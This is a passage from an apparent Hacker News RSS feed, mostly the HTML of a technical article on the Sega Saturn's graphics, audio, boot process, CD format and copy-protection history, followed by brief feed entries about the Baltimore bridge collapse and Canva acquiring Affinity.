selection of effects:</p><ul><li>Two <strong>shading algorithms</strong> (Flat and Gouraud) for lighting.</li><li><strong>Anti-aliasing</strong>: In this case, it duplicates pixels to cover gaps during mapping.</li><li><strong>Clipping</strong> to discard polygons outside the camera’s viewport.</li><li><strong>Transparency</strong> to blend two non-opaque bitmaps.</li></ul><p><strong>Two 256 KB frame buffer chips</strong> are available to concurrently draw new scenes of the game without breaking the current one being displayed. When the secondary buffer is finished being drawn, the VDP1 starts broadcasting the latter instead (<strong>page-flipping</strong>), and the cycle continues.</p></div><div id="tab-1-2-vdp2"><h4 id="tab-1-2-vdp2">VDP2</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/vdp/VDP2.b23bf279fc4d3d3a0f46ed7550fa3463341a71412266f51e1ee99d95d0bf7c52.png"><picture><img alt="Image" width="585" height="504" src="https://www.copetti.org/images/consoles/saturn/vdp/VDP2.b23bf279fc4d3d3a0f46ed7550fa3463341a71412266f51e1ee99d95d0bf7c52.png" loading="lazy"></picture></a><figcaption>VDP2 Architecture.</figcaption></figure><p>The <strong>Video Display Processor 2</strong> (VDP2) specialises in rendering large (4096×4096 pixels) planes with transformations (rotation, scale and translation) applied on them <sup id="bibref:10"><a href="#bib:graphics-vdp2" role="doc-biblioref">[10]</a></sup>.</p><p>More importantly, the VDP2’s renders <strong>on-the-fly</strong> (without a frame-buffer) like previous <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#constructing-the-frame">tile-based engines</a>. It can display up to <strong>16.7 million colours</strong> (24-bit). This chip is also responsible for displaying the VDP1’s buffer, which can also be transformed and/or mixed with the VDP2’s layers. The VDP2’s ‘frame’ is composed of up to four 2D planes and one 3D plane; or two 3D planes.</p><p>This chip relies on <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#constructing-the-frame">tile-maps</a> to compose planes and performs <strong>perspective correction</strong> for 3D texture mapping, this is a more sophisticated approach which takes into account the depth value to compute rotations.</p><p>Effects available include <strong>multi-texturing</strong> (mapping more than one texture per polygon) and <strong>shadowing</strong>. With the latter, after the VDP2 receives the sprites generated by the VDP1, it can reduce their brightness and blend them with half-transparency. Nonetheless, the VDP2 only receives a sprite stream from the VDP1 (in pace with the CRT beam) so this function tends to be tricky to encode and operate.</p><p>This chip also houses <strong>4 KB of Colour RAM (CRAM)</strong> which is used to translate VDP1’s custom colour values (index colours) into 24-bit RGB colours.</p><p>Finally, even though the VDP2 is limited to two 3D planes, nothing prevents the CPU from using its VRAM as frame-buffer area to draw additional 2D or 3D graphics in software.</p><p>I recommend checking out the sources (at the end of the article) if this section got your attention, since the VDPs have a lot more quirks that are beyond the scope of this article.</p></div></div></div><h3 id="defining-the-problem">Defining the problem</h3><p>As you can see, the architecture of the graphics sub-system is quite complex, so it’s interpreted differently depending on the needs:</p><h3 id="as-a-powerful-2d-console">As a powerful 2D console</h3><p>The capabilities of the Saturn for drawing 2D scenes were huge compared to the <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/">Mega Drive</a> or <a href="https://www.copetti.org/writings/consoles/super-nintendo/">SNES</a>, although they weren’t the main selling point of this console.</p><div><ul><li id="tab-2-1-sprites-link"><a href="#tab-2-1-sprites">Sprites</a></li><li id="tab-2-2-backgrounds-link"><a href="#tab-2-2-backgrounds">Backgrounds</a></li><li id="tab-2-3-result-link"><a href="#tab-2-3-result">Result</a></li></ul><div><div id="tab-2-1-sprites"><h4 id="tab-2-1-sprites">Sprites</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/2d/sprites.aed26d0c131764932c5b011cde056cc3c3f2b96383da5eacdfb7cd74890bc5ac.png"><picture><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/sprites.aed26d0c131764932c5b011cde056cc3c3f2b96383da5eacdfb7cd74890bc5ac.png" loading="lazy"></picture></a><figcaption>Mega Man X4 (1997).<br>VDP1’s Sprites plane.</figcaption></figure><p>In this case, the VDP1 is tasked with plotting traditional sprites without any 3D distortion applied.</p><p>The CPU sets up the VDP1 by writing over its registers and filling its VRAM with commands and tiles. The process can also be accelerated thanks to the DMA controller.</p></div><div id="tab-2-2-backgrounds"><h4 id="tab-2-2-backgrounds">Backgrounds</h4><figure><ul><li id="tab-3-1-2d-plane-1-link"><a href="#tab-3-1-2d-plane-1">2D plane 1</a></li><li id="tab-3-2-2d-plane-2-link"><a href="#tab-3-2-2d-plane-2">2D plane 2</a></li><li id="tab-3-3-2d-plane-3-link"><a href="#tab-3-3-2d-plane-3">2D plane 3</a></li></ul><figure id="tab-3-1-2d-plane-1"><a href="https://www.copetti.org/images/consoles/saturn/2d/bg1.806c3496225c21fd9d20c28c26e89258d054652f3a7a3f91498475dc8aa7563d.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/2d/_hu29a58c724f173a0d5fa24f9f7ed2543f_65354_e0baf528b2ce12a099abc6349e62c94b.webp 500w,
https://www.copetti.org/images/consoles/saturn/2d/_hu29a58c724f173a0d5fa24f9f7ed2543f_65354_c0ddcb61315017b87fbc1bf5b258f5cc.webp 640w"><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/bg1.806c3496225c21fd9d20c28c26e89258d054652f3a7a3f91498475dc8aa7563d.png" loading="lazy"></picture></a><figcaption>2D plane 1.</figcaption></figure><figure id="tab-3-2-2d-plane-2"><a href="https://www.copetti.org/images/consoles/saturn/2d/bg2.d4c8d3f742b50c3a320381de54f55c915f18cfa6b11ffb9c7b89deef8518d734.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/2d/_hu44ce6785b9058ab8bf7d8766d9806a32_177511_08343901bc8cd28b89cf6d6770760c04.webp 500w,
https://www.copetti.org/images/consoles/saturn/2d/_hu44ce6785b9058ab8bf7d8766d9806a32_177511_c32ffcf3fd0342e67c444c6f7876ca79.webp 640w"><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/bg2.d4c8d3f742b50c3a320381de54f55c915f18cfa6b11ffb9c7b89deef8518d734.png" loading="lazy"></picture></a><figcaption>2D plane 2.</figcaption></figure><figure id="tab-3-3-2d-plane-3"><a href="https://www.copetti.org/images/consoles/saturn/2d/bg3.6e360c2e15e3bd3710e092555e9dbbab1dbc8cad8b077c613a4553294edf2c90.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/2d/_hu3a215beb78fc89771688c0eccbfc7e12_88802_45c432f6f66a4974fbac19969b1edb38.webp 500w,
https://www.copetti.org/images/consoles/saturn/2d/_hu3a215beb78fc89771688c0eccbfc7e12_88802_fd0d325089a9a53cfc14b998fdfc6007.webp 640w"><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/bg3.6e360c2e15e3bd3710e092555e9dbbab1dbc8cad8b077c613a4553294edf2c90.png" loading="lazy"></picture></a><figcaption>2D plane 3.</figcaption></figure><figcaption>Mega Man X4 (1997). VDP2’s Background planes.</figcaption></figure><p>The VDP2 is then instructed to draw background planes. These, along with the sprite layer, are automatically mixed to form a fully coloured scene.</p><p>The commanding part is fundamentally similar to the VDP1: Programmers got registers and VRAM to set up accordingly.</p><p>Some functions from the VDP2 can be exploited to create more realistic scenery, such as scaling to simulate a heatwave (see ‘2D plane 2’).</p></div><div id="tab-2-3-result"><h4 id="tab-2-3-result">Result</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/2d/result.4fc30597f8b95bc2085d22e404b09e8cb52b7004e06da50bfc28290b700ac3e2.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/2d/_hu31050179c0105c57de890a2b789e9556_64327_6f6bfaf1f4809b91e437e17f74e5cb92.webp 500w,
https://www.copetti.org/images/consoles/saturn/2d/_hu31050179c0105c57de890a2b789e9556_64327_6dc514cb6f330ab9918cf439e6237d0c.webp 640w"><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/result.4fc30597f8b95bc2085d22e404b09e8cb52b7004e06da50bfc28290b700ac3e2.jpg" loading="lazy"></picture></a><figcaption>Mega Man X4 (1997). Mixed planes (<em>Tada!</em>).</figcaption></figure><p>Not much mystery here, the VDP2 is responsible for the last step of sending the processed signal to the video encoder.</p><p>The VDP2 operates in sync with the CRT beam, meaning that its computations correspond to the pixels that will be displayed on the next scan line.</p></div></div></div><h3 id="as-a-challenging-3d-console">As a challenging 3D console</h3><p>Here’s where the Saturn <em>shined and struggled</em> at the same time. While this console had eight processors to take advantage of, it all came down to:</p><ul><li>Whether programmers would be able to master most of the console’s features during a small time frame (remember the console’s commercial lifespan would be over once its successor is released, or even announced).</li><li>Whether their game would be shipped at a reasonable date.</li></ul><p>For this reason, most games ended up dramatically ranging in quality since each studio came up with a unique solution.</p><div><ul><li id="tab-4-1-3d-modelling-link"><a href="#tab-4-1-3d-modelling">3D modelling</a></li><li id="tab-4-2-pixel-processing-link"><a href="#tab-4-2-pixel-processing">Pixel processing</a></li></ul><div><div id="tab-4-1-3d-modelling"><h4 id="tab-4-1-3d-modelling">3D modelling</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/3d/models.0a95b90d32068033e0fcf8a67199e2dcac6118c22067def8896c5ffb4d439699.png"><picture><img alt="Image" width="697" height="437" src="https://www.copetti.org/images/consoles/saturn/3d/models.0a95b90d32068033e0fcf8a67199e2dcac6118c22067def8896c5ffb4d439699.png" loading="lazy"></picture></a><figcaption>Virtua Fighter Remix (1995).<br>3D models of characters without textures or background. Notice the primitives used to build the models.</figcaption></figure><p>So far we’ve been using individual regular quadrilaterals to form sprites and/or background layers. But what if we group multiple irregular primitives and arrange them to form a more complex figure? This is how 3D models come to fruition.</p><p>To put it in simple terms, classic 2D consoles like the <a href="https://www.copetti.org/writings/consoles/super-nintendo/">Super Nintendo</a> arranges their graphics (backgrounds and sprites) in quasi-rectangular areas. In some cases, such as with <a href="https://www.copetti.org/writings/consoles/super-nintendo/#unique-features">Mode 7</a>, programmers can supply a rotation matrix to apply transformations over some of these areas. The Saturn, by contrast, allows defining 4-point quadrilaterals with arbitrary angles between their edges (Sega calls them ‘distorted sprites’). Then, the VDPs’ texture mapping capabilities paint the quadrilateral’s area with a texture, the latter is scaled to conform to the polygon’s shape.</p><p>In terms of operations needed with a 3D game, the CPUs and SCU are assigned to formulating a 3D world and project it in a 2D space. Then, both VDPs are commanded to render it, apply effects and finally broadcast it on TV.</p></div><div id="tab-4-2-pixel-processing"><h4 id="tab-4-2-pixel-processing">Pixel processing</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/3d/complete.42b6a7e00f11f9e18fb97440ba9fa3510cd3c2943e465d52659e24e4ced689f3.png"><picture><img alt="Image" width="704" height="448" src="https://www.copetti.org/images/consoles/saturn/3d/complete.42b6a7e00f11f9e18fb97440ba9fa3510cd3c2943e465d52659e24e4ced689f3.png" loading="lazy"></picture></a><figcaption>Virtua Fighter Remix (1995).<br>Rendered scene with 3D models and backgrounds.</figcaption></figure><p>Either VDP can draw this new (projected) 3D space and stamp textures and effects. Now, which chip is ‘in charge’ varies between each game.</p><p>Some prioritised the VDP1 to draw the closest polygons and left the VDP2 to process distant scenery, others found interesting workarounds to task the VDP2 to draw closer polygons (thereby off-loading the amount of geometry fed into the VDP1). The challenge consists in designing an efficient engine that could display <em>impressive</em> graphics while keeping an acceptable frame rate.</p></div></div></div><h3 id="the-new-designs">The new designs</h3><p>These are some examples of characters that were re-designed for this console, the models are interactive so do try to fiddle with them!</p><p>While the Saturn is only able to draw quadrangles, you’ll soon notice that these models exhibit two triangles instead of a single quadrangle in ‘Wireframe’ mode. This is because the format used to encode this model (glTF, an open standard for modern 3D modelling), so your modern device can render it, doesn’t support quadrangles at the time of this writing. So, I recommend switching to ‘Surface’ mode to observe the quads.</p><p>In some way, this tells you how the current graphics technology can struggle to reproduce their ~30-year-old predecessors!</p><h3 id="an-introduction-to-the-visibility-problem">An introduction to the visibility problem</h3><p>When 3D polygons are projected onto a 2D space, it is crucial to determine <strong>which polygons are visible from the camera’s position and which are hidden behind</strong> <sup id="bibref:11"><a href="#bib:graphics-vsd" role="doc-biblioref">[11]</a></sup>. Otherwise, models are not drawn correctly, effects like transparency appear ‘broken’ and ultimately, hardware resources are wasted. This process is widely known as <strong>Visible surface determination</strong> or ‘VSD’ and it’s a fundamental problem in the world of computer graphics. There are multiple papers published that describe algorithms that tackle this at different stages of the graphics pipeline. Some of them give very accurate results, while others trade precision for better performance.</p><p>Now, unlike academic/professional equipment, consumer hardware is incredibly limited, so the choice of algorithm is narrowed down to just a few… or none whatsoever.</p><div><figure><a href="https://www.copetti.org/images/consoles/saturn/projectz.f3bbf2215c139f454cb6606d15fca9d439e1935d8bcad2e69ddbc1514dc4ba47.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/_hu6d6d6508d38b1484d215cec630a9cfda_117807_c434c79e7a2e39ef331cbae69baf5b16.webp 500w,
https://www.copetti.org/images/consoles/saturn/_hu6d6d6508d38b1484d215cec630a9cfda_117807_899ba92c9e3f0ad854df28f38e22a7e2.webp 704w"><img alt="Image" width="704" height="448" src="https://www.copetti.org/images/consoles/saturn/projectz.f3bbf2215c139f454cb6606d15fca9d439e1935d8bcad2e69ddbc1514dc4ba47.jpg" loading="lazy"></picture></a><figcaption>Project Z-Treme (2019, Homebrew) <sup id="bibref:12"><a href="#bib:graphics-ztreme" role="doc-biblioref">[12]</a></sup>.<br>This engine ditched Z-sort in favour of a binary space partitioning (BSP) approach, fixing the glitches.</figcaption></figure><p>The Sega Saturn approach is what I consider a ‘semi-solved’ case. The VDP1 doesn’t implement any VSD function: You either feed the geometry in the correct order or you get a mess. However, Sega provided a graphics library called ‘SGL’ that implemented a solution called <strong>Z-sort</strong> or <strong>Painter’s algorithm</strong> <sup id="bibref:13"><a href="#bib:graphics-sgl" role="doc-biblioref">[13]</a></sup> which performs <strong>polygon sorting by software</strong>.</p><p>Essentially, SGL allocates a buffer to sort the polygons based on the distance from the camera (from furthest to nearest), then, issues the display commands to the VDP1 in that order.</p></div><p>One of the issues of Z-sort with 3D spaces is that its distance value (Z-order) is <strong>approximated</strong>, so graphic glitches may still appear. For this, programmers can skip SGL in favour of implementing their own algorithm.</p><p>In later articles, you will see alternative approaches. Some still rely on software, while others are accelerated by hardware.</p><h3 id="the-transparency-issue">The transparency issue</h3><p>The Sega Saturn is capable of drawing <strong>half-transparent graphics</strong>, in other words, mixing overlapping layers of colours (blending) to give the illusion we can see through them. Unfortunately, both VDPs aren’t as coordinated as one would expect, so this effect will not work properly when these layers are found in different VDPs.</p><p>As a workaround, games can activate the ‘mesh’ property on a texture. With ‘meshed’ textures, the VDP1 sets the odd X/Y texture coordinates as ‘transparent’ (empty). Making it possible to blend other layers using the transparent pixels. Curiously enough, the mesh would appear blurred if the console was connected to the TV using the composite video signal (which was pretty much the standard back then, aside from RF) resulting in an accidental but effective way to accomplish half-transparency <sup id="bibref:14"><a href="#bib:graphics-geer" role="doc-biblioref">[14]</a></sup>.</p><p>As you may suspect, this just wasn’t viable for some games, so in the end, these had no option but to ditch half-transparency altogether… Although some studios found ingenious fixes, take a look at these two cases:</p><figure><figure><video poster="https://www.copetti.org/images/consoles/saturn/video_posters/daytona.81b963bc475e2178039efcfbb2fc7e8f15b891473b7a95a856d04a810b97946c.jpg" preload="none" width="640" height="424" src="https://www.copetti.org/videos/consoles/saturn/daytona.2e198ac188497880d3e590e8389d6230e514612581212f9c8d56f973fb498ef9.mp4" controls="" controllist="nodownload">
No support for video.</video><figcaption>Sega’s Daytona (1993).</figcaption></figure><figure><video poster="https://www.copetti.org/images/consoles/saturn/video_posters/sonicr.628de8fed8e7e796ed02de4d932fef12223c3516bd1905077086a70d38ceeb8e.jpg" preload="none" width="640" height="472" src="https://www.copetti.org/videos/consoles/saturn/sonicr.7b727bcecc2d80908338132b32e006aa3858cb837ac3bed3f6da28239d30f4fe.mp4" controls="" controllist="nodownload">
No support for video.</video><figcaption>Traveller’s Tales’ Sonic R (1997).</figcaption></figure><figcaption>Both games command the VDP1 to draw foreground objects and background scenery. In turn, the VDP2 renders the landscape image far away and the stats in front of the 3D models. Consequently, VDP1 models with half-transparency won’t refract the VDP2’s landscape as the VDP1 is not aware of the VDP2’s frame buffers.</figcaption></figure><p>Apart from my terrible gameplay, you’ll notice that the background of the first game pops out of nowhere (no half-transparency) whereas the second game not only accomplished half-transparency but also a <strong>fading effect</strong>: Traveller’s Tales found a workaround by changing the ‘mix ratio’ registers of the VDP2 (used for defining the texture’s alpha) combined with switching the lighting levels as the character gets closer <sup id="bibref:15"><a href="#bib:graphics-burton" role="doc-biblioref">[15]</a></sup>.</p><hr><h2 id="audio">Audio</h2><p>The sound subsystem consists of several parts <sup id="bibref:16"><a href="#bib:audio-scsp" role="doc-biblioref">[16]</a></sup>:</p><ul><li><strong>Motorola 68EC000</strong>: Controls the other components and interfaces with the main CPUs. It runs a <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#the-conductor">sound driver</a> to operate the neighbour components.</li><li><strong>Saturn Custom Sound Processor</strong> (SCSP): Also referred to as Yamaha YMF292, it’s composed of two modules:<ul><li>A <strong>multi-function sound generator</strong>: Processes up to <strong>32 channels</strong> with <strong>PCM samples</strong> (up to 16-bit with 44.1 kHz, a.k.a ‘CD quality’) or <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#audio">FM channels</a>. In the case of the latter, a number of channels are reserved for operators.</li><li>A <strong>DSP</strong>: Applies effects like echo, reverb and chorus. The docs also mention ‘filters’ but I don’t know if it means envelope or frequency filter (i.e.&nbsp;low pass, etc).</li></ul></li><li><strong>512 KB of RAM</strong>: Stores the driver, audio data (i.e.&nbsp;PCM samples) and it’s also a working area for the DSP.</li></ul><h3 id="the-opportunity">The opportunity</h3><p>The new audio capabilities mean that studios can finally record/produce soundtracks in-house and then bundle them in the game without having to re-arrange it (as it happened with limited <a href="https://www.copetti.org/writings/consoles/super-nintendo/#audio">sequencers</a> or chips with strict <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#audio">synthesis methods</a>).</p><p>This has been possible thanks to a combination of many factors:</p><ul><li>The new storage medium for games (CD-ROM) enables developers to store large soundtracks.</li><li>The audio endpoint receives and mixes PCM data with acceptable quality.</li><li>The audio subsystem provides enough power and bandwidth to stream PCM data in some compressed form, and then decode it on-the-fly.</li></ul><hr><h2 id="operating-system">Operating System</h2><p>Once the user powers on the console, the first component that starts up is the <strong>System Management &amp; Peripheral Control</strong> (SMPC), a 4-bit microcontroller that takes care of initialising the neighbouring chips (such as switching on two SH-2s and setting them in a ‘master-slave’ configuration) <sup id="bibref:17"><a href="#bib:games-smpc" role="doc-biblioref">[17]</a></sup>.</p><figure><figure><a href="https://www.copetti.org/images/consoles/saturn/ipl/logo_jap.763d14af000051f75cda703fa5241e82b6cd215f5adfae9b29f9d8b38a77e2a3.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/ipl/_hu0b5b6c76da3d5b8615c08a00e7e1a69c_75233_6888c01d1b35b093c9a6a3bf463c57cd.webp 500w,
https://www.copetti.org/images/consoles/saturn/ipl/_hu0b5b6c76da3d5b8615c08a00e7e1a69c_75233_452b41409bf1a67d2a7eddf143bc4bd8.webp 640w"><img alt="Image" width="640" height="448" src="https://www.copetti.org/images/consoles/saturn/ipl/logo_jap.763d14af000051f75cda703fa5241e82b6cd215f5adfae9b29f9d8b38a77e2a3.jpg" loading="lazy"></picture></a><figcaption>Japanese version.</figcaption></figure><figure><a href="https://www.copetti.org/images/consoles/saturn/ipl/logo_eu.a03d01269ea4ef59cb3ff04253cc524adbae127b2641a07aeecd311ced809cad.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/ipl/_hu5554528e37891a047104441c80ff122b_73677_d05837062416c3143a9cfd97e52dfcdf.webp 500w,
https://www.copetti.org/images/consoles/saturn/ipl/_hu5554528e37891a047104441c80ff122b_73677_8307edad70d5c14b1c3c2431c593eff6.webp 640w"><img alt="Image" width="640" height="448" src="https://www.copetti.org/images/consoles/saturn/ipl/logo_eu.a03d01269ea4ef59cb3ff04253cc524adbae127b2641a07aeecd311ced809cad.jpg" loading="lazy"></picture></a><figcaption>European and American versions.</figcaption></figure><figcaption>Logo displayed after splash animation finishes.</figcaption></figure><p>Afterwards, the master SH-2’s reset vector is set to <code>0x00000000</code> <sup id="bibref:18"><a href="#bib:games-sh2" role="doc-biblioref">[18]</a></sup>, which points to an internal ROM containing the <strong>Initial Program Loader</strong> (IPL). This program performs the following functions <sup id="bibref:19"><a href="#bib:operating_system-bootrom" role="doc-biblioref">[19]</a></sup>:</p><ol><li>Finish initialising the hardware.</li><li>If there’s a cartridge inserted and it includes a program, continue booting from there.</li><li>If the ‘Video CD’ card is inserted, boot it.</li><li>If there’s a disc inserted, check that it’s genuine.<ul><li>While at it, it displays the splash screen animation.</li></ul></li><li>If the disc is genuine, boot the game.</li><li>If the disc is not genuine or there’s no disc inserted, run the shell.</li></ol><h3 id="interactive-shell">Interactive shell</h3><p>Alternatively to playing games, the Saturn included a music player called ‘Multiplayer’, from which a save manager can be opened.</p><p>If a Video CD card is inserted, the player can reproduce MPEG video decoded from the card itself.</p><h3 id="no-bios">No BIOS?</h3><p>Unlike the <a href="https://www.copetti.org/writings/consoles/playstation/">PlayStation</a> whose ROM chip bundled a <a href="https://www.copetti.org/writings/consoles/playstation/#operating-system">BIOS</a>, which in turn exposed APIs for programmers to use. The Saturn’s ROM is often called ‘IPL’ presumably since its main job is to bootstrap the game and run the shell. However, the latter still stores some routines (called <strong>services</strong>) to manipulate the hardware (such as managing save data and power control). It even implements a ‘semaphore’! (used to synchronise operations that involve multiple processors at the same time). Hence, that part of the ROM is called <strong>System program</strong>.</p><hr><h2 id="games">Games</h2><p>Official Sega Saturn games are loaded from the <strong>2x CD-ROM reader</strong>. Its medium, the compact disc (CD), has a capacity of <strong>680 MB</strong> and Sega Saturn games follow the <strong>ISO 9660</strong> standard for storing data <sup id="bibref:20"><a href="#bib:games-format" role="doc-biblioref">[20]</a></sup>. Additionally, many games store audio tracks next to the data tracks for streaming uncompressed audio while executing the game.</p><h3 id="the-compact-disc-cd">The Compact Disc (CD)</h3><p>The CD is an optical medium where information is stored by engraving <strong>pits</strong> and <strong>lands</strong> on its polycarbonate surface <sup id="bibref:21"><a href="#bib:cpu-optical" role="doc-biblioref">[21]</a></sup>. Then, an infrared light is beamed from the reader and the reflection produced on the CD’s surface is used to read the information back.</p><p>The process of converting digital information (ones and zeroes) into pits and lands and vice versa is not simple by any means, especially since CDs must be robust enough to sustain day-to-day damage and intensive use; and reliable enough to store any kind of information without fear of data loss. Hence, as part of its specification, data is encoded using the <strong>Non-Return-to-Zero inverted</strong> (NRZi) model, meaning that the bitstream will be all zeroes until a land-to-pit or pit-to-land change is detected, at which a <code>1</code> will be appended instead.</p><p>This design works well until the reader encounters a sequence of ones (continuous pit and land changes) or long sequences of zeroes (constant pits or lands), at which the sensor will struggle to detect or keep synchronised, respectively. Thus, an additional model called <strong>Eight-to-Fourteen</strong> (ETF) modulation is applied. With this, a handful of zeroes are padded in-between the encodings, these help the sensor during the reading process.</p><p>On top of all this, further mechanisms of error detection may be added, although these are beyond the scope of this article. If you are interested in learning more, you can check out a slide presentation from RWTH Aachen University <sup id="bibref:22"><a href="#bib:cpu-optical" role="doc-biblioref">[22]</a></sup>.</p><h3 id="development">Development</h3><p>At first, Sega didn’t provide complete software libraries and development tools (in fact, the initial documentation was inaccurate) so the only way to achieve good performance was through <em>harsh</em> assembly.</p><p>Later on, Sega released complete SDKs, hardware kits and some libraries to ease I/O and graphics operations. Overall, games are written in a mix of <strong>C</strong> and various assemblies targeting individual components.</p><h3 id="io">I/O</h3><p>Peripheral management and real-time clock are also provided by the aforementioned <strong>System Management &amp; Peripheral Control</strong> (SMPC). The SMPC is controlled with commands sent by the SH-2s.</p><h3 id="expansion-methods">Expansion methods</h3><p>This console bundles a considerable number of external connectors and interfaces that only received a handful of uses, at most.</p><ul><li>Behind the drive there’s a <strong>cartridge slot</strong> officially used for <strong>additional storage</strong> (save data) or <strong>extra RAM</strong>. In Japan and the United Stated, a modem was also offered to provide <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#early-network-attempts">online functionality</a>.</li><li>At the back of the console, there’s a slot for a <strong>Video CD Card</strong> that performs MPEG decompression for programs/games that support it.</li><li>Finally, there’s a mysterious socket at the back of the console called <strong>Communication Connector</strong>. Sega didn’t publish any documentation for developers, but after some reverse engineering efforts, people discovered that it’s connected to the SCSP’s MIDI pins and the two SH-2’s serial interface (SCI) <sup id="bibref:23"><a href="#bib:games-development" role="doc-biblioref">[23]</a></sup>. In any case, Sega released a Floppy drive that relied on this interface.</li></ul><hr><h2 id="anti-piracy-homebrew">Anti-Piracy &amp; Homebrew</h2><p>In response to the easiness of cloning a CD, Saturn added a copy protection system (along with region locking) to control the distribution of games.</p><p>Copy protection on CDs is applied by burning special data (called ‘system area’) out of reach from conventional burners, the Saturn refuses to boot the disc as a ‘game disc’ if the out-of-reach data is not found or it’s invalid. The disc reader also contains a custom <strong>SH-1</strong> processor that interfaces with the rest of the console using obscured protocols.</p><p>It’s worth mentioning that since Saturn CDs follow the ISO9660 (a standard file system for CD data), PCs can read the game disc without problems (but, of course, they can’t execute the game unless they use an emulator).</p><h3 id="defeat">Defeat</h3><p>First of all, the classic method used for disabling the copy protection consisted in installing a <strong>mod-chip</strong> that could trick the CD reader when a burned disc is inserted. There was also a ‘swap trick’ that consisted in <strong>hot-swapping</strong> a genuine disc with a burned one just after the protection checks passed… with the risk of damaging the drive!</p><p>After the turn of the century, alternative but more sophisticated methods used for running unauthorised code were discovered, for instance:</p><ul><li>An <strong>exploit in the copy protection mechanism</strong> was found and it allowed to boot up any disc game without going through the copy protection checks. This was subsequently in the form of a cartridge called <strong>pseudosaturn</strong> <sup id="bibref:24"><a href="#bib:anti_piracy-pseudosaturn" role="doc-biblioref">[24]</a></sup>. Due to the use of the cartridge medium, Action Replay cartridges are often re-flashed with pseudosaturn (though the flasher also needs to be bootstrapped somehow, most commonly through the swap trick).<ul><li>This method is still being used as of 2022, although a new fork of pseudosaturn named ‘Pseudo Saturn Kai’ is installed instead.</li></ul></li><li>Another method was reported in 2016 (almost 20 years later) by exploiting the fact that the <strong>Video CD add-on can inject unencrypted code</strong> to the CD subsystem (bypassing the CD reader altogether). This finally allowed users to load Homebrew independently of the ageing drive. The Video CD exploit is commercially distributed in a product called ‘Satiator’ (I’m not sponsored, by the way).</li><li>Finally, there’s another commercial alternative that replaces the CD reader with an SD or SATA adapter. The Saturn still thinks it’s reading from a CD, but the ‘CD’ is being emulated by the adapter, which is in turn reading from a disc image <sup id="bibref:25"><a href="#bib:anti_piracy-ode" role="doc-biblioref">[25]</a></sup>. These products are called <strong>Optical Drive Emulators</strong> (ODE).</li></ul><hr><h2 id="thats-all-folks">That’s all folks</h2><figure><a href="https://www.copetti.org/images/consoles/saturn/mine.e96ef88708e597771584d2cdab33134986934020e7863ce6293b17d999d16ae0.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/_hu42db0004e070320862ad06f7d95006f4_128861_0881f77d5a3134ba6187a6473d340b74.webp 500w,
https://www.copetti.org/images/consoles/saturn/_hu42db0004e070320862ad06f7d95006f4_128861_40622bc6f8adc42b1af72fb7df93ea74.webp 800w,
https://www.copetti.org/images/consoles/saturn/_hu42db0004e070320862ad06f7d95006f4_128861_39af2a2402e6d9876b3cc80769b4cdac.webp 1111w"><img alt="Image" width="1111" height="799" src="https://www.copetti.org/images/consoles/saturn/mine.e96ef88708e597771584d2cdab33134986934020e7863ce6293b17d999d16ae0.jpg" loading="lazy"></picture></a><figcaption>A Japanese Saturn I acquired to get more material for this article. While the games look fine, it was thanks to the Saturn’s enormous Homebrew library that I was able to understand the real capabilities of this console.</figcaption></figure></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Francis Scott Key Bridge in Baltimore, Maryland Has Collapsed (690 pts)]]></title>
            <link>https://twitter.com/sentdefender/status/1772514015790477667</link>
            <guid>39825033</guid>
            <pubDate>Tue, 26 Mar 2024 07:25:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/sentdefender/status/1772514015790477667">https://twitter.com/sentdefender/status/1772514015790477667</a>, See on <a href="https://news.ycombinator.com/item?id=39825033">Hacker News</a></p>
Couldn't get https://twitter.com/sentdefender/status/1772514015790477667: Error: Request failed with status code 400]]></description>
        </item>
        <item>
            <title><![CDATA[Canva acquires Affinity, its biggest acquisition, to compete with Adobe (261 pts)]]></title>
            <link>https://finance.yahoo.com/news/canva-acquires-affinity-design-suite-004813952.html</link>
            <guid>39824191</guid>
            <pubDate>Tue, 26 Mar 2024 04:05:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://finance.yahoo.com/news/canva-acquires-affinity-design-suite-004813952.html">https://finance.yahoo.com/news/canva-acquires-affinity-design-suite-004813952.html</a>, See on <a href="https://news.ycombinator.com/item?id=39824191">Hacker News</a></p>
